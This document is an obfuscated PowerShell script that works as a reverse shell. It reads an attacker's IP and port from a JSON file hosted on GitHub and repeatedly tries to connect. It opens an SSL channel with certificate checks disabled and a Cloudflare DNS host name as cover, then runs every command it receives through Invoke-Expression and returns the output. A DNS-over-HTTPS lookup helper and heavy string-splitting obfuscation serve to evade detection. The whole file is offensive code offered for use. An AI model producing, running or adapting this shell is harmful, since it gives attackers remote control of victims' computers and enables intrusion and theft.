 Sv  (     'A'    +    'id'  ) (    [tYPE](  'SYS'   + 'TE'  +   'm.T'   +     'ext.ENC'  +  'odiNg'   )     )     ;    function DnS`l`ooKUp(  ${dN`SREC`OrD}  ){
    ${rES`PON`SE}   =    (     . (  'I'   +   'nvok'     +    'e' +  '-WebRequ'  +    'es'  +    't'   ) (     (   'h'      +    'tt'  +    (     'ps'    + ':'      )  +   ( '/'    +    (    '/' +   '1.'   )    +  (  '1.' +    '1'  )    +      ( '.1' +  '/' )   )      +     'dn'    +   (    's-'  +    'qu' )    +    'er'   +   'y'   +    ( (   '?na'  +    'm'   )  + 'e'   )   +  '='     + ( 'p'  +   (  'owe'   + 'rs'    +     'hel'    ) +  'l' +   '-r'  )  +  'e'   +    (  (     'v'    +'erse'    )  +  '-s'  +   (   'hell'    +     '.d' )  )  +   'em' +  (   (    'o'    +   '.e'  )   +   'xa'    + 'm'    +    (    'ple' + '.c'    )     )   +     (     'om'   +  (     '&'    +     'type='   )     ) )    +  ${dNsR`ec`oRd}   ) -Headers @{(   (  'a'   +    'cc'    )     +    (      'e' +    'pt'      )   )   =   (     (  (    'app'    +   'l'     )  +     'ic' )  +     'a'  +     't' +     (    (  'i'     +   'on')    +   '/'    +   (     'd'    +    'ns'      )      )   +    (  '-j'    +    'so') +    'n' )}   )."CoNtE`NT"
    return (    $aId::"uT`F8"."gE`T`striNG"(   ${RES`p`onSE})     |       &  (   'Co'  +    'nv'   +    'er'   +   'tFrom-Json'    )    )."A`N`SwEr"."Da`Ta".(    't'   + 'rim'   )."In`Vo`ke"(   '"'     )
}

${j}     =    &   (  'Invok'      +     'e'   +     '-Res'  +   't'   + 'Method' ) -Uri (    (   ( 'h'  +    'ttps://'  +  'g'    )    +'it'  +    'h' )   +    (  ( 'u' +    'b.'    )     +   'c'  )  +     'o'   +   'm/'    +     (   'So'    +   'u'    +     (  'm'   +  'yo00'  +  '1/'   ) +  'p'    )   +    'r'    +   (    (  'og'  +   'r'   )    +     'e'   )    +     (    (   's'   +  'si'  )      +    'v'     )  +   'e'  +    (   '_'   +  '0v'  +    (    'e'   +   'rlo'   +'ad/ra'   )   +  'w' +  ( '/re'    +   'f'   )      )   + ('s'     +'/h'     )  +  (   ('ea' + 'd'   )     +'s/'   )+  'm' +   (  'a'    +     'in'   )    +   (    (     '/p'      +    'a'   )    + 'y'   ) +     (   'lo'   +     'a'   +   (  'd'   +     's/'  )  )  +   (    (   'i'   +   'p_'   )    +     (   'por'   +   't.')    )  + 'j'    +    (   's'     +   'on'   )    )

${REmOt`Eip}    =      ${j}."ip"
${ReM`o`TepORt}  =       ${j}."Po`Rt"

do {
      .    (    'Star'     +   't-'   +    'S'+   'leep'     ) -Seconds 1
    try{
        ${t`cPC`ONn`eCt`ioN}   =      &    (     'New-O'   +    'b'     +  'jec'     +      't'   ) (     'Syst'+     'em.Ne'   +   't.'    +     'Sockets.'  +  'TcpC'    +   'l'   +  'ien' +  't' )(    ${rEm`ot`Eip}, ${r`em`OT`EpOrT}   )
    }catch{}
} until (    ${TC`PCoNn`eCt`iOn}."c`o`NneCt`eD"   )


${ne`T`wORkSt`RE`AM}     =      ${tcpc`onN`e`CtI`ON}.(   'Ge'     + 't'  +  'Stream'   )."inVO`ke"(      )
${S`sLStRe`AM}   =       & (  'New'   +   '-O'      +   'bject'    ) (  'Syste'     +   'm.Ne'   +    't.S'    +  'e'  + 'curity.SslSt'    +    'rea'    +  'm'    )(  ${n`EtwORK`streAM}, ${F`A`lSe}, (  {${tR`Ue}} -as [System.Net.Security.RemoteCertificateValidationCallback] )  )
${SslSTR`E`AM}.(  'Aut'+    'h' +   'entica'  +     't'   +    'eAsCli'  +  'e'   +  'nt'   )."iN`VOkE"(     (     'c'  +      'lo'   +    (   'ud' +     (    'f' +  'la'  )  + (  're-d'   +  'ns'   )   )  +    (  '.'    +   'co'     )   +   'm'  ), ${nU`LL}, ${f`Alse})

if (     !${S`s`LsT`ReaM}."i`s`AuThenTIc`AteD" -or !${SSl`sTre`Am}."is`sig`Ned" ) {
    ${S`sLST`RE`Am}.(   'Cl'   +'ose'   )."inV`OkE"(      )
    exit
}


${S`TreA`MWRi`TEr}  =       .  (  'New-' +    'Ob'    +  'ject'  ) (    'Sys'  +  'tem.I'  +    'O.S'     +    'treamWri'    +  'ter')(  ${S`sLst`Re`Am}  )

function WRiTEsTre`Am`TosE`R`V`eR(   ${S`TR`ing}     ){
    [byte[]]${s`cR`IPT:bUf`FER}     =    0..${tc`PcOnN`EC`T`ion}."REC`EIVe`BUFFERs`I`ze"      |          .   (   '%'     ) {0}
    ${str`Ea`MwRiT`er}.(   'Writ'     +    'e'    )."In`VO`KE"(    ${S`TRINg}   +    (  'SH'   +  (   (  'EL' +   'L'   )   +  ' '    )   )   +(     .  (     'Get-'  +   'Loca'  +   'tion'   )     )."p`AtH"   +    (    ' '    +   ':>' )     )
    ${STRe`AMw`R`iT`eR}.(    'Flu' +    'sh'   )."in`VokE"(        )
}

    &    ( 'writeStre'   +   'am'   +    'ToSe'  +   'rv'  + 'er'    ) ''

while (    (      ${BytE`sRe`Ad}   =    ${sSLS`Tr`Eam}.(   'R'   +  'ead'     )."in`VokE"(     ${s`c`R`ipt`:bUFfER}, 0, ${scRIP`T`:BU`F`Fer}."le`NGtH"   )   ) -gt 0   ) {

    ${C`O`mMANd}     =      (  variable (   'A'    +'ID'   )  -VALuEoNly   )::"ut`F8"."GE`T`strInG"(    ${SCrIpT:B`U`Ff`eR}, 0, ${B`Y`TESRE`Ad} - 1    )

    ${C`o`Mma`Nd_OuTp`UT}  =      try {
           &  (   'Invo'    +     'ke-Expr'  +'ess'    +  'i'    +'on'    ) ${cO`m`mAND} 2>&1     |      .  (     'Out-Stri'  +   'n'   +    'g'     )
    }
    catch {
        ${_}     |      &    (    'Out-'  +    'St' +     'rin'  +  'g'   )
    }
        .  (  'write'    +     'StreamT'    +  'oSe'      +     'rv'    +  'e'     +     'r' )(  ${COMMa`N`D_`oUtpUt}   )
}

${StrEA`mW`RiT`er}.(   'C'   +    'lose'  )."I`N`Voke"(    )